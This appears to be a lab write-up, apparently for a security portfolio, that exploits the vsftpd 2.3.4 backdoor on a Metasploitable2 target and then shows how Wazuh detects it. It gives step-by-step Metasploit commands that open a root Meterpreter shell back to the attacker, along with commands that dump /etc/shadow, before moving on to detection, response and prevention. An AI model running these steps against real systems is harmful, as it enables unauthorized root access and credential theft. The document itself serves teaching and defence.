# Project 1 – vsftpd 2.3.4 Backdoor: Exploitation, Detection & Incident Response

## Objective

This project demonstrates how a critical backdoor vulnerability in vsftpd 2.3.4 can be exploited to gain root access on a target system. It also shows how a SIEM (Wazuh) detects and maps the attack to MITRE ATT&CK tactics in real time.


## Attack Summary

- Vulnerability: vsftpd 2.3.4 backdoor
- Access Gained: Root shell (no authentication required)
- Key IOC: Unexpected service on port 6200
- Detection Source: Syslog logs ingested into Wazuh
- MITRE ATT&CK Tactics: Initial Access, Privilege Escalation, Discovery, Credential Access


## Tools Used

- Kali Linux (Attacker)
- Metasploitable2 (Vulnerable Target)
- Metasploit Framework
- Nmap
- Wazuh SIEM



## Lab Environment

|Machine        |IP Address    |Role           |
|---------------|--------------|---------------|
|Kali Linux     |192.168.56.102|Attacker       |
|Metasploitable2|192.168.56.103|Target         |
|Wazuh          |192.168.56.105|SIEM / Defender|



## Step 1: Scan the Target

Run an Nmap service scan to identify open ports and running services on the target:

```bash
nmap -sV 192.168.56.103
```
Key finding: Port 21 is running vsftpd 2.3.4 — a version known to contain a backdoor.

![Nmap Scan](screenshots/nmap-scan.png)



## Step 2: Launch Metasploit

Open Metasploit on Kali Linux:

```bash
msfconsole
```
Wait for the msf6 > prompt to appear.


## Step 3: Load the vsftpd Exploit
```bash
use exploit/unix/ftp/vsftpd_234_backdoor
show options
```
This loads the exploit module. The show options command displays what needs to be configured.


## Step 4: Configure and Run the Exploit

Set the target IP and your Kali IP, then run:
```bash
set RHOSTS 192.168.56.103
set LHOST 192.168.56.102
run
```
Result:
[+] 192.168.56.103:21 - Backdoor has been spawned!
[*] Meterpreter session 1 opened (192.168.56.102:4444 → 192.168.56.103:55744)

![Meterpreter Session](screenshots/meterpreter-session.png)



## Step 5: Confirm Root Access

Drop into a shell and confirm identity:
```bash
shell
id
whoami
```
Result:
uid=0(root) gid=0(root)
whoami: root

Full root access was obtained without providing any credentials.

![Root Access](screenshots/root-access.png)



## Step 6: Post-Exploitation Discovery

Run discovery commands to simulate attacker behaviour after gaining access:
```bash
cat /etc/shadow
cat /etc/passwd
netstat -antp
ps aux
``` 
What each command does:

- cat /etc/shadow — dumps hashed passwords for all users
- cat /etc/passwd — lists all user accounts on the system
- netstat -antp — maps active network connections
- ps aux — lists all running processes

![Shadow File](screenshots/etc-shadow.png)

![Netstat Output](screenshots/netstat-output.png)



## Step 7: Check Wazuh for Detections

On the Wazuh dashboard, navigate to Security Events and filter by the target IP 192.168.56.103.

Wazuh generated 13 security events including:

|Rule ID|Description                     |Severity  |
|-------|--------------------------------|----------|
|533    |Listened ports status changed   |Medium (7)|
|5402   |Successful sudo to ROOT executed|Low (3)   |
|5501   |PAM Login session opened        |Low (3)   |
|5502   |PAM Login session closed        |Low (3)   |

![Wazuh Security Events](screenshots/wazuh-security-events.png)

## Detection Insights

- Rule 533 (Port Change Detection): Triggered due to the backdoor opening port 6200, which is not associated with normal FTP operations.
- Rule 5501/5502 (PAM Activity): Indicates session activity that may correlate with unauthorized access.
- Rule 5402 (Privilege Escalation): Suggests elevated access, although in this case root access was obtained directly via exploitation.

Key Insight:  
The most reliable indicator of compromise in this attack is the presence of port 6200, which is strongly associated with the vsftpd backdoor.


## Step 8: MITRE ATT&CK Mapping

Wazuh automatically mapped the attack activity to MITRE ATT&CK tactics:

- Initial Access — T1190 Exploit Public-Facing Application
- Privilege Escalation — T1068 Exploitation for Privilege Escalation
- Discovery — T1087 Account Discovery, T1049 Network Connections Discovery
- Credential Access — T1003 OS Credential Dumping

![MITRE ATT&CK Dashboard](screenshots/wazuh-mitre-dashboard.png)


## Analysis

The attack successfully exploited a known backdoor in vsftpd 2.3.4, granting immediate root access without authentication. 
From a defensive perspective, the exploitation itself was not directly detected by Wazuh. Instead, detection relied on behavioral indicators such as:
- A new listening service (port 6200)
- Privileged session activity
- System-level command execution

This highlights a key detection gap: application-layer exploitation may go unnoticed unless supported by network or host-based monitoring.
However, post-exploitation activity generated sufficient telemetry for detection, demonstrating the importance of monitoring system behavior rather than relying solely on exploit signatures.


## Incident Response Perspective

Triage:
- Identify alert related to unusual port activity (port 6200)
- Correlate with system logs and session activity

Investigation:
- Confirm presence of unauthorized service
- Check active connections using netstat
- Review process list for suspicious activity

Containment:
- Isolate affected host from the network
- Terminate malicious sessions

Eradication:
- Remove vulnerable vsftpd version
- Patch or rebuild the system

Lessons Learned:
- Monitor for abnormal port activity
- Implement host-based intrusion detection
- Regularly patch public-facing services

## Key Points to Note

- The vsftpd 2.3.4 backdoor was introduced into the source code in 2011 as a supply chain attack
- No credentials were needed — the backdoor opens a root shell on port 6200 automatically
- The active Meterpreter connection was visible in netstat output — a key IOC
- Wazuh detected the attack purely through syslog forwarding — no agent was installed on the target
- Port 6200 appearing in network logs is a reliable indicator of this specific attack



## Preventive Measures

- Upgrade vsftpd to a non-backdoored version immediately
- Replace FTP with SFTP for secure file transfers
- Block port 6200 at the firewall — it has no legitimate use
- Monitor /etc/shadow access — legitimate systems rarely read this file directly
- Use a SIEM to alert on privilege escalation and unusual sudo activity
- Deploy host-based intrusion detection systems (HIDS) for better visibility into system activity



## Detection Improvements

- Create a custom Wazuh rule to alert specifically on port 6200 activity
- Correlate FTP service logs with unusual shell access
- Implement file integrity monitoring for critical files like /etc/shadow


## MITRE ATT&CK Techniques

|Technique ID|Name                                 |
|------------|-------------------------------------|
|T1595       |Active Scanning                      |
|T1190       |Exploit Public-Facing Application    |
|T1068       |Exploitation for Privilege Escalation|
|T1003       |OS Credential Dumping                |
|T1087       |Account Discovery                    |
|T1049       |System Network Connections Discovery |
|T1057       |Process Discovery                    |

